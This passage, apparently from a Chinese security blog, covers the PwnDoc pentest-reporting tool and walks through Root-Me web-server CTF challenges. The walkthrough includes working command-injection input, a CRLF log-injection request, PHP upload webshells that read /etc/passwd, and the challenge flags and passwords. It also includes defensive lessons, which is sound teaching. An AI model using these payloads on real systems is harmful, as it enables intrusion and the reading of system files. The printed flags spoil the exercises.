<p>模板准备好之后，可以在<strong>Data-&gt;Templates</strong>点击右上角<code>Create Template</code>进行上传。</p>
<p><img data-src="templates_0.png"></p>
<h2 id="配置Audit-Type"><a href="#配置Audit-Type" class="headerlink" title="配置Audit Type"></a>配置Audit Type</h2><p>在正式开始使用前，还剩下最后一个步骤需要完成：我们必须要定义至少一个Audit Type.<br>这里可以预定义不同的测试类型：Web Application, Network, OS Level等等。<br>对于不同类型的测试，我们可以预先定义使用哪种渗透测试报告模板，需要在对应的渗透测试报告中包含哪些板块。</p>
<p>这里，我先创建了一个针对Web Application的测试类型，这里偷懒没有准备中文的报告模板，所以在两种语言里面都选择了英文模板。同时由于是针对Web Application的测试，所以我勾选了隐藏<em>Network Scan</em>的选项。</p>
<p><img data-src="AuditTypes_0.png"></p>
<p>至此为止，点击Audit我们就可以看到成功进入了这个应用的核心功能模块了。</p>
<p><img data-src="Audit_0.png"></p>
<hr>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://cloud.tencent.com/developer/article/1722304">https://cloud.tencent.com/developer/article/1722304</a></li>
<li><a href="https://pwndoc.github.io/pwndoc/">https://pwndoc.github.io/pwndoc/</a></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
        <category>Tools</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Web Application</tag>
        <tag>Reporting</tag>
        <tag>PwnDoc</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试报告自动化工具PwnDoc(二)</title>
    <url>/zh-CN/e8e3dab8/</url>
    <content><![CDATA[<p>这篇主要介绍PwnDoc实际使用的方法。<br>PwnDoc的安装及准备步骤请参考<a href="https://upwnothing.github.io/zh-CN/4398caef/">上篇</a></p>
<span id="more"></span>

<p>进入Audits模块，创建一个新的项目。<br>创建完成后可以看到以下界面<br><img data-src="audit_1.png"></p>
<p>可以按照实际情况填写这些信息，这些信息最终可以按需要被直接生成在最终的报告中。</p>
<p>基本功能的使用其实非常直观，也不复杂。点击finding旁边的加号添加新的发现项<br><img data-src="audit_2.png"></p>
<p>然后在我们之前导入的漏洞类型列表中找到发现项所属的类别<br><img data-src="audit_3.png"></p>
<p>按照实际测试中的发现，把相关的信息添加到对应的输入框内。如果之前漏洞类型数据库维护得完善的话，这一步需要加入的主要就是截图及相应的步骤说明。<br><img data-src="audit_4.png"></p>
<h1 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h1><p>在全部编辑完，需要生成报告时，可能会发现应用报出错误<br><img data-src="error_0.png"><br>这个报错信息可以说是非常令人困惑了！那么我们要如何来debug呢？</p>
<p>我们可以在运行应用的机器上执行</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">cd &lt;<span class="built_in">insert</span> path&gt;<span class="regexp">/src/</span>pwndoc</span><br><span class="line">docer-compose logs --tail <span class="number">0</span> -f pwndoc-backend</span><br></pre></td></tr></table></figure>
<p>通过服务器的日志来找到具体的报错信息。当然，这也是这个应用需要完善的地方。</p>
]]></content>
      <categories>
        <category>Security</category>
        <category>Tools</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Web Application</tag>
        <tag>Reporting</tag>
        <tag>PwnDoc</tag>
      </tags>
  </entry>
  <entry>
    <title>Root-Me WebServer分类 解题思路 （一）</title>
    <url>/zh-CN/f0181575/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><a href="https://root-me.org/">Root Me</a>是一个非常不错的在线网络安全技能专项练习网站。比起其他的一些模拟练习平台，这个网站相对而言更”Noob friendly”…对于渗透测试有兴趣又不知道如何入门的同学，不妨可以从这个网站开始入手。  </p>
<p>本文包含WebServer分类中前十六题全部的解题思路。<a href="https://upwnothing.github.io/zh-CN/afcc83f6">第二部分</a>正在施工中…</p>
<span id="more"></span>

<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p><a href="#HTML-Sourde-code">HTML - Source code</a><br><a href="#HTTP-Open-redirect">HTTP - Open redirect</a><br><a href="#HTTP-User-agent">HTTP - User-agent</a><br><a href="#Weak-password">Weak password</a><br><a href="#PHP-Command-injection">PHP - Command injection</a><br><a href="#Backup-file">Backup file</a><br><a href="#HTTP-Directory-indexing">HTTP - Directory indexing</a><br><a href="#HTTP-Headers">HTTP - Headers</a><br><a href="#HTTP-POST">HTTP - POST</a><br><a href="#HTTP-Improper-redirect">HTTP - Improper redirect</a><br><a href="#Install-files">Install files</a><br><a href="#CRLF">CRLF</a><br><a href="#File-upload-Double-extensions">File upload - Double extensions</a><br><a href="#File-upload-MIME-type">File upload - MIME type</a><br><a href="#HTTP-Cookies">HTTP - Cookies</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="HTML-Source-code"><a href="#HTML-Source-code" class="headerlink" title="HTML - Source code"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTML-source-code">HTML - Source code</a></h2><p>送分题。主要目的只是跟新用户打个招呼！</p>
<p>直接查看页面源代码即可。解题密码在HTML的注释中。</p>
<p><img data-src="html_sourcecode.png"></p>
<blockquote>
<p>虽然这只是一道送分题，但同时，这种题目也给刚接触Web App渗透测试的新手一个非常不错的提示：<br>千万不要忽视任何你可以获得的信息。对于在页面源码注释中发现造成安全漏洞的关键信息，在现实中其实也很常见。会有开发者将一些测试用帐号密码直接注释，就发布到了网络上。更多的情况下，泄漏的信息不像密码这么直接，但绝对能给有攻击意图的黑客带去极大的帮助&#x2F;提示。</p>
</blockquote>
<h2 id="HTTP-Open-redirect"><a href="#HTTP-Open-redirect" class="headerlink" title="HTTP - Open redirect"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect">HTTP - Open redirect</a></h2><p><img data-src="open_redirect_0.png"></p>
<p>这个页面的功能很简单，页面中间有三个按钮。你点击了某个按钮，页面就会跳转到对应的社交网络应用(Facebook, Twitter, Slack)。<br>根据描述，我们的目标是让页面跳转到除上述三个网站外的任何一个网页。所以，研究一下这个页面是如何实现跳转功能的： </p>
<p>查看源码，我们可以看到，网页将目标地址作为url参数进行传递，通过服务器端实现重定向的跳转。除了url参数之外，还有一个h参数。参数的值是一个32位的16进制字符串。具体作用还不知道。但是根据参数名字h，以及32位长度的特征，可以大致猜测应该是一个MD5的Hash值。</p>
<p><img data-src="open_redirect_1.png"></p>
<p>首先尝试仅修改<code>url=</code>后面的值，观察是否能够完成跳转。完整的url为: <code>http://challenge01.root-me.org/web-serveur/ch52/?url=https://baidu.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134</code>  </p>
<p><img data-src="open_redirect_2.png"></p>
<p>看上去，我们没有能够成功进行跳转。错误的信息为:”incorrect hash!”(错误的哈希）。这证实了我之前关于h参数是哈希值的猜测。现在的任务就是找出这个是谁的哈希值。</p>
<p>简单尝试两次：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">richard@richard-Kali:~$ <span class="built_in">echo</span> -n https://facebook.com | <span class="built_in">md5sum</span></span><br><span class="line">a023cfbf5f1c39bdf8407f28b60cd134  -</span><br><span class="line">richard@richard-Kali:~$ <span class="built_in">echo</span> -n url=https://facebook.com | <span class="built_in">md5sum</span></span><br><span class="line">44c27492004e8d0d46ac5b19377f8a16  -</span><br></pre></td></tr></table></figure>

<p>Bingo！很轻松就找到了。就是对<code>url</code>参数的值进行了md5哈希。所以我们只需要对我们提供的值计算一次md5即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">richard@richard-Kali:~$ <span class="built_in">echo</span> -n https://baidu.com | <span class="built_in">md5sum</span></span><br><span class="line">40674b7fe4c1ee59dbaffe877c6ac2e3  -</span><br></pre></td></tr></table></figure>

<p>将得到的结果重新组合构成新的URL请求： <code>http://challenge01.root-me.org/web-serveur/ch52/?url=https://baidu.com&amp;h=bb6e082d5c360ce6a0c64f926feea905</code>  </p>
<p>再次尝试，顺利拿到了flag： <code>e6f8a530811d5a479812d7b82fc1a5c5</code>  10分顺利到手～</p>
<p><img data-src="open_redirect_3.png"></p>
<blockquote>
<p>要点1：</p>
<p>可能有人会产生疑问：跳转到百度又怎么了？这有什么不安全的？<br>跳转到百度确实没怎么样，但是允许任何人通过修改URL来控制网页的跳转，是会产生极大的安全风险的！！设想以下场景：某个银行的网站存在这么一个参数可以完成任意跳转，那么攻击者可以创建一个 <a href="http://www.fakebank.com/">www.fakebank.com</a> 的网页，使其与银行的页面看上去完全一样，然后将以下链接发送给受害者：<a href="http://www.bank.com/?url=www.fakebank.com">www.bank.com/?url=www.fakebank.com</a>. 光看链接的开头，受害者很容易就相信这是真实的官方网站。然而，点击这个链接进入的实际却是黑客精心准备的”陷阱“！ 攻击者还会在链接中加入其他无效参数进行混淆，使url参数的值变得极其难以发现，增加攻击的成功率。所以，一定要避免使用这样的方式实现跳转。这确确实实会造成安全风险。</p>
</blockquote>
<blockquote>
<p>要点2：</p>
<p>这个网页能可考虑到了上述的问题，所以加入了哈系进行校验。但是，显而易见，这样的校验完全没有起到作用。这说明了，永远不要依赖用户可以修改的值作为数据校验。这只是掩耳盗铃罢了…</p>
</blockquote>
<h2 id="HTTP-User-agent"><a href="#HTTP-User-agent" class="headerlink" title="HTTP - User-agent"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-agent">HTTP - User-agent</a></h2><p>点开这个挑战的页面，提示其实很明确：“Wrong user-agent: you are not the “admin” browser!” （错误的user-agent:你没有使用”admin”浏览器）  </p>
<p>这个挑战是关于修改HTTP请求头中User-Agent的值。这里就不多对HTTP请求头及User-Agent属性做过多的介绍了。随手搜一下就能找到非常多的详细讲解。简而言之，User-Agent是HTTP请求头中记录用户浏览器信息的属性。  </p>
<p>为了修改HTTP请求头中的属性，用到的思路是在本地设置代理，截取浏览器发出的HTTP请求。在代理中对请求进行篡改后，再将请求发送到目标服务器上。具体的实现方法有很多：通过代理工具（Burp），浏览器插件或者是Python脚本来实现。这里我使用Burp来完成。</p>
<p>在浏览器中将代理设置为127.0.0.1:8080 (Burp的默认端口，可以根据情况自行配置）。设置完成后，重新发送请求。可以看到Burp成功截取了这个HTTP请求。</p>
<p><img data-src="user_agent_0.png" alt="Burp截取到的HTTP请求"></p>
<p>将<code>User-Agent</code>的值修改为要求的<code>admin</code>。并点击Forward将请求转发到目标服务器。</p>
<p><img data-src="user_agent_1.png" alt="修改User-Agent"></p>
<p>Bingo! 成功获取了Flag～</p>
<p><img data-src="user_agent_2.png"></p>
<p>解题密码： <code>rr$Li9%L34qd1AAe27</code></p>
<blockquote>
<p>要点：<br>HTTP请求头中的数据也属于“用户输入”数据。不要轻易信赖HTTP请求头中的数据,</p>
</blockquote>
<h2 id="Weak-Password"><a href="#Weak-Password" class="headerlink" title="Weak Password"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/Weak-password">Weak Password</a></h2><p>点开<a href="http://challenge01.root-me.org/web-serveur/ch3/">页面</a>，首先弹出的是一个身份验证的对话框。</p>
<p><img data-src="weak_password_0.png"></p>
<p>结合挑战的主题，首先尝试一下最常见的几组弱密码：user&#x2F;user; admin&#x2F;admin; user&#x2F;password;…</p>
<p>结果admin&#x2F;admin的用户名密码对就直接成功登录了！</p>
<p><img data-src="weak_password_1.png"></p>
<p>喂喂喂！这也太简单了吧…完全没想到居然这么容易就通过了。。。这题居然只有34%的通过率我也是没有料到。</p>
<blockquote>
<p>要点：<br>在安全运营的过程中，要设计合理完善的密码策略，避免弱密码，尤其是默认密码的出现。因为弱密码而产生的安全事件连起来已经可以绕地球好几圈了，一次又一次地因为这种相当容易避免的问题而造成非常大的损失是一件很让人沮丧的事情。</p>
</blockquote>
<h2 id="PHP-Command-Injection"><a href="#PHP-Command-Injection" class="headerlink" title="PHP - Command Injection"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection">PHP - Command Injection</a></h2><p>题目很明确的说明了，这是一道命令注入的挑战题。进入页面尝试一下，发现这个页面实现的是ping用户提供的IP地址的功能。</p>
<p><img data-src="command_injection_0.png"></p>
<p>可以大概思考一下实现的方式：PHP接受用户的输入，然后将其与”ping”进行拼接，然后发送给系统进行执行。所以注入的方式也很明显，就是在IP地址之后加入分割符，然后再加上自己想要执行的命令。所以尝试一下<code>127.0.0.1; ls</code>看看这个页面有没有输入校验。</p>
<p><img data-src="command_injection_1.png"></p>
<p>啊哈！果然是一道比较初级的题目，ls命令被成功执行了。我们看到多了一行index.php的输出。根据提示，在<code>index.php</code>文件中，有我们想要找到的解题密码。所以调整输入：</p>
<p><code>127.0.0.1; cat index.php</code></p>
<p>结果，只是在末尾多了一个输入框。看起来，应该是输出的php脚本被页面同时做了解析。看看页面源码确认一下吧？ </p>
<p><img data-src="command_injection_2.png"></p>
<p>哈哈，有意外发现。flag被加在了php的注释区域内。ok，这道题就完成了！</p>
<p>Flag为<code>S3rv1ceP1n9Sup3rS3cure</code></p>
<blockquote>
<p>要点：<br>这道题再次反应了用户输入校验的重要性。在应用开发的过程中，务必要确保对接受到的用户输入进行校验，确保用户的输入与设计的功能是相匹配的，否则的话，狡猾的用户们一定会制造出你意想不到的效果。</p>
</blockquote>
<h2 id="Backup-File"><a href="#Backup-File" class="headerlink" title="Backup File"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/Backup-file">Backup File</a></h2><p>打开页面，看到的是如下的登录界面。简单尝试了几个简单用户名密码，发现并不能成功登录。</p>
<p><img data-src="backup_file_0.png"></p>
<p>先快速查看一下页面源码，可惜没有发现任何线索。根据题目的名字 <em>backup file</em> , 尝试在URL后面添加backup等路径名，尝试是否存在跨目录攻击。但也没有任何发现。</p>
<p>Emmmm…第一次陷入僵局！好的呗，偷偷瞄一眼论坛讨论。有一条回复给出了这个链接<a href="https://en.wikipedia.org/wiki/List_of_filename_extensions">https://en.wikipedia.org/wiki/List_of_filename_extensions </a>作为提示。</p>
<p>原来是跟备份文件的文件后缀有关。常见的备份文件后缀名有：  </p>
<ul>
<li>??$</li>
<li><del>1</del></li>
<li>~??</li>
</ul>
<p>现在的问题就是我们需要在哪个文件后面加上后缀呢？最原始的页面路径为<code>http://challenge01.root-me.org/web-serveur/ch11/</code>,没有包含任何文件名称。所以，我们需要猜测一下默认的文件名称。对于PHP比较熟悉的童鞋肯定会知道PHP的默认主页文件是index.php. 那就尝试一下呗！访问<code>http://challenge01.root-me.org/web-serveur/ch11/index.php</code>,嘿嘿！果然，我们看到了完全相同的页面。好叻，既然已经知道了文件名，那么下一步只需要添加上文件后缀，再逐个尝试就可以了。</p>
<p>当访问<code>http://challenge01.root-me.org/web-serveur/ch11/index.php~??</code>时，页面自动下载了一个名为<code>index.php_</code>的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="string">&quot;ch11&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;OCCY9AcNm1tj&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">      &lt;html&gt;</span></span><br><span class="line"><span class="string">      &lt;body&gt;</span></span><br><span class="line"><span class="string">	&lt;h1&gt;Authentication v 0.00&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]!=<span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]==<span class="variable">$user</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]==<span class="variable">$password</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;&lt;h2&gt;Welcome back <span class="subst">&#123;$row[&#x27;username&#x27;]&#125;</span> !&lt;/h2&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;&lt;h3&gt;Your informations :&lt;/h3&gt;&lt;p&gt;- username : <span class="subst">$row</span>[username]&lt;/p&gt;&lt;br /&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;To validate the challenge use this password&lt;/b&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;&lt;h3&gt;Error : no such user/password&lt;/h2&gt;&lt;br /&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">	&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">	  Login&amp;nbsp;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	  &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	  Password&amp;nbsp;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	  &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	  &lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	  &lt;input type=&quot;submit&quot; value=&quot;connect&quot; /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	&lt;/form&gt;</span></span><br><span class="line"><span class="string">      &lt;/body&gt;</span></span><br><span class="line"><span class="string">      &lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用得到的帐号密码登录，即可！</p>
<p><img data-src="backup_file_1.png"></p>
<p>根据提示，原来用密码直接验证就可以。15分到手！</p>
<p>Flag为<code>OCCY9AcNm1tj</code>。</p>
<blockquote>
<p>要点：<br>在实际生产环境中，类似的问题其实也经常会发生。我们需要额外注意系统产生的备份文件与临时文件（比如vim编辑时也会在相同路径下生成临时文件）。这类文件如果被外部访问，就会直接产生源代码泄漏的事件。虽然在实际情况下，源码不会包含网页的登录信息，但是在很多时候的的确确会有数据库连接的登录信息。 一旦发生源代码泄露，同时数据库的access control又存在缺陷的话，那就直接是一起非常严重的数据库泄漏事件了。[坏笑]</p>
</blockquote>
<h2 id="HTTP-Directory-Indexing"><a href="#HTTP-Directory-Indexing" class="headerlink" title="HTTP - Directory Indexing"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-Directory-indexing">HTTP - Directory Indexing</a></h2><p>点进页面一片空白，那就查看一下源码呗。然后源码里有一段注释：<code>&lt;!-- include(&quot;admin/pass.html&quot;) --&gt;</code> 啊…就这？就这？</p>
<p>访问一下这个页面看看呗…？？？？被骗了？</p>
<p><img data-src="directory_indexing_0.png"></p>
<p>大致意思就是“被骗了吧！你肯定不是最后一个被骗的！好好再找找去吧！”。Hmmm…法式幽默！行吧，那就再找找咯！</p>
<p>仔细再看看这题的名字： <strong>Directory Indexing</strong>。既然已经提到了是目录索引，应该是跟访问目录的访问控制问题有关。那哪个路径可能存在类似的问题呢？你们肯定也都想到了吧：admin。</p>
<p>尝试访问一下admin路径：<code>http://challenge01.root-me.org/web-serveur/ch4/admin/</code> 果然！我们直接看到了admin路径下的索引列表：</p>
<p><img data-src="directory_indexing_1.png"></p>
<p>接下去的步骤不难猜测，顺着目录一步步找下去，在<code>backup/</code>下有一个名为<code>admin.txt</code>的文件。 </p>
<p>直接找到Flag: <code>Linux</code>。这15分应该还算是比较简单的。</p>
<blockquote>
<p>要点：<br>这属于错误安全配置所造成的一个常见的结果。可以参考<a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration">OWASP Security Misconfiguration</a>中的Scenario #2. 攻击者可以随意浏览服务器上，与网页相关的文件。通过这种方式，攻击者可以获得到源代码，配置信息，身份认证信息等等关键文件。可能产生的影响不言而喻。 </p>
</blockquote>
<h2 id="HTTP-Headers"><a href="#HTTP-Headers" class="headerlink" title="HTTP - Headers"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers">HTTP - Headers</a></h2><p>先看题目与提示：HTTP Header, HTTP response give informations (HTTP响应会提供信息) </p>
<p>OK，这个提示算是相当明显了。我们需要查看页面返回的HTTP头中的内容。</p>
<p><img data-src="headers_0.png"></p>
<p>我们看到了一项名为<code>Header-RootMe-Admin: none</code>的Header参数值。那我们在发出的请求中加入这个HTTP头部字段，并修改他的值，看看会产生什么样的结果。</p>
<p><img data-src="headers_0.png"></p>
<p>哦霍！直接成功。一下子就获取到了Flag: <code>HeadersMayBeUseful</code></p>
<blockquote>
<p>要点：<br>就像原题中提示的那样，HTTP响应的信息并不仅仅包含你所看到的页面的内容。HTTP的头部字段里也会有很多重要的信息。而且，这部分信息是用户可控的！！如果要使用HTTP头部字段的值，那就千万要记得把这个数据作为用户输入数据来对待，进行输入校验后再拿来使用。</p>
</blockquote>
<h2 id="HTTP-POST"><a href="#HTTP-POST" class="headerlink" title="HTTP - POST"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-POST">HTTP - POST</a></h2><p>这道题目的说明是: Find a way to beat the top score! (想个办法来击败最高分)  </p>
<p>挑战页面如下：</p>
<p><img data-src="post_0.png"> </p>
<p>点击”Give a try!”按钮，页面会随机生成一个数字。当然，结果永远是一样的，都比不过999999。咋办？只能开挂了！！既然标题是POST，那么就使用Burp拦截一下看看，POST有什么内容。</p>
<p><img data-src="post_1.png"> </p>
<p>这就简单了。分数原来是在客户端生成，并通过POST中的一个参数进行传递的。那我们只需要对POST中的数字进行篡改，就可以了。就像这样：</p>
<p><img data-src="post_2.png"> </p>
<p>发送！顺利得到flag: <code>H7tp_h4s_N0_s3Cr37S_F0r_y0U</code>  </p>
<p><img data-src="post_3.png"> </p>
<blockquote>
<p>要点：<br>这道题的主要目的就是了解HTTP协议中，通过POST来传递数据的方法。虽然我们通过浏览器没法直接修改POST中的数据，但这并不意味着POST传递的数据就可以保证数据是可靠的。修改POST的数据同样也是非常容易办到的。</p>
</blockquote>
<h2 id="HTTP-Improper-redirect"><a href="#HTTP-Improper-redirect" class="headerlink" title="HTTP - Improper redirect"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-Improper-redirect">HTTP - Improper redirect</a></h2><p>同样的，还是先看一眼描述与提示：Don’t trust your browser(不要相信你的浏览器); Get access to index (想办法进入index)。ok，先看看页面具体是怎么样的。</p>
<p><img data-src="improper_redirect_0.png"></p>
<p>有一个用户登录界面，看描述应该是需要通过php重定向的方法来绕过验证，进入到index页面。在浏览器中直接访问index.php，我们会被重定向到login.php进行身份验证。看似好像没有什么毛病。但是，如果我们尝试用Burp来仔细观察一下重定向的过程，问题就显现出来了。</p>
<p><img data-src="improper_redirect_0.png"></p>
<p>虽然状态码是302重定向，但是我们可以惊讶地发现，index.php页面源码居然也完完整整地显示了出来。。。通过这种方式，我们就相当于绕开了用户认证，就访问到了受限制的页面。我们可以轻易地看到Flag: <code>ExecutionAfterRedirectIsBad</code>  </p>
<p>这个问题产生的原因是这样的：在PHP编写的时候，判断用户未授权的条件下，直接使用了<code>header(&#39;Location:xxx/login.php&#39;)</code>。脚本执行的时候，确实会返回302的HTTP响应，但除此之外，PHP在添加了重定向路径后，并没有停止执行，而是继续将页面的内容输出到了HTTP响应的body中。虽然在浏览器上，用户并不会直接看到未授权的页面，但是实际上，这个页面的内容已经完完整整地发送到了用户手里。</p>
<blockquote>
<p>要点：<br>就跟描述里说的那样，你通过浏览器所看到的内容并不一定就是实际从服务器返回的全部内容。这点在安全测试的过程中尤为重要。</p>
</blockquote>
<h2 id="HTTP-Verb-tampering"><a href="#HTTP-Verb-tampering" class="headerlink" title="HTTP - Verb tampering"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/HTTP-verb-tampering">HTTP - Verb tampering</a></h2><p>动词篡改？看到这个挑战的标题，我第一反映是有点懵… 但是后来仔细思考了一下，这里的verb应该指的是HTTP请求的方法。  </p>
<p>众所周知（应该是吧），HTTP请求的方法有 GET, POST (最常用), HEAD, PUT, DELETE, TRACE, OPTIONS, CONNECT 这八种。这里面HEAD和OPTIONS也不是动词呀…? Anyway,先看一下挑战页面呗。</p>
<p><img data-src="verb_tampering_0.png"></p>
<p>好的呗，这个页面被保护了，需要用户身份验证才能访问。所以，我们要做的就是尝试修改HTTP请求的方法，看看是不是有机会绕过身份验证。默认的HTTP请求方法是GET。我们使用Burp将请求的方法改成上述列出的其他方法逐个尝试一下：</p>
<p><img data-src="verb_tampering_1.png"></p>
<p>使用DELETE方法发送请求，服务器直接给我们返回了解题的flag: <code>a23e$dme96d3saez$$prap</code> </p>
<blockquote>
<p>要点：<br>这个挑战说明的是通过篡改HTTP请求方法来绕过Web授权和认证的例子。这种情况大多数是在配置的时候产生的。由于GET&#x2F;POST请求相对而言更加常用，所有很多开发者&#x2F;运维人员会只考虑到对这两种HTTP请求方法进行配置，而忽视了剩余的HTTP请求方法。因此，在进行配置时，一定要确保安全约束策略覆盖到所有的HTTP请求方法。</p>
</blockquote>
<h2 id="Install-files"><a href="#Install-files" class="headerlink" title="Install files"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/Install-files">Install files</a></h2><p>这道题打开页面一片空白。我一开始还以为网络连接有问题，后来发现并不是。那就先观察一下页面的源码。果然，在注释中发现了这么一行：</p>
<p><img data-src="install_files_0.png"></p>
<p>根据这个提示再点开<code>http://challenge01.root-me.org/web-serveur/ch6/phpbb</code>。点开以后我们发现！！除了Root-me的header之外，依旧是一片空白。。。- -</p>
<p>好吧，结合这题的提示”You know phpBB ?”，先去往上查一下PHPBB的相关信息：PHPBB是一个使用PHP开发的开源网络论坛系统。再简单搜索一下PHPBB与文件安装相关的漏洞，我们发现，phpBB的安装路径为install目录。我们访问该路径就可以看到目录下的文件列表，我们可以看到有<code>install.php</code>这么一个文件。访问这个文件，我们直接可以获取到解题flag:<code>karambar</code>  </p>
<blockquote>
<p>要点：<br>其实这道题的总结，在install.php里面已经全部写出来了。只不过是法语的，我们需要翻译一下：<br>这个缺陷实际上是对网站站长的监督，这些文件应该在使用后都被正确地删除，包含 phpbb 论坛的安装页。<br>虽然此类漏洞已经越来越少地发生，因为开发人员使用了验证系统。<br>然而，我们需要了解的是，我们还是可以发现许多篡改 URL的方法…<br>通过这些方法，攻击者可以重置论坛，并更改所有管理员密码，初始化论坛。</p>
</blockquote>
<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/CRLF">CRLF</a></h2><p>同样的，登录到挑战页面，可以看到一个用户登录界面。随便尝试登录会发现，每次登录尝试都会在日志中生成一条记录。</p>
<p>我第一个想到的是这可能是一道XSS的题目，所以尝试用户名<code>test&lt;script&gt;</code>。啊偶，看上去<code>&lt;script&gt;</code>被正确地打印了出来，不太对。</p>
<p><img data-src="crlf_0.png"></p>
<p>这个时候才想起来返回重新看一下题目的说明，原来是需要在日志里面注入内容。结合挑战的名称，那应该就是利用换行符进行分割，注入一行成功登录的信息。在日志中我们可以看到有admin用户成功登录的记录。所以就使用同样的内容进行注入： </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /web-serveur/ch14/?username=admin authenticated.%<span class="number">0</span>d%<span class="number">0</span>atest123&amp;password= HTTP/<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>顺利获得flag: <code>rFSP&amp;G0p&amp;5uAg1%</code></p>
<p><img data-src="crlf_1.png"></p>
<h2 id="File-upload-Double-extensions"><a href="#File-upload-Double-extensions" class="headerlink" title="File upload - Double extensions"></a><a href="https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions">File upload - Double extensions</a></h2><p>题目就非常明显了，通过双后缀来绕过服务器端的文件上传类型检查。登录页面，找到上传功能。然后在本地编辑一段读取&#x2F;etc&#x2F;passwd的PHP代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;../../../../etc/passwd&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并命名为<code>test.php.jpg</code>保存到本地。再将其上传。果然！！失败了…</p>
<p><img data-src="double_extensions_0.png"></p>
<p>但好消息是，我们的脚本顺利地绕过了文件上传的类型检测，并被服务器解析了。但是，php代码本身存在一些问题，所以没有顺利读取到<code>/etc/passwd</code>的内容。所以，我们需要对我们的php代码进行一下微调。<br>既然无法直接用PHP函数读取文件的内容，我们就尝试通过调用系统命令执行函数来完成。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat ../../../../../../etc/passwd&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>OK!这下我们可以成功看到&#x2F;etc&#x2F;passwd的内容了！</p>
<p><img data-src="double_extensions_1.png"></p>
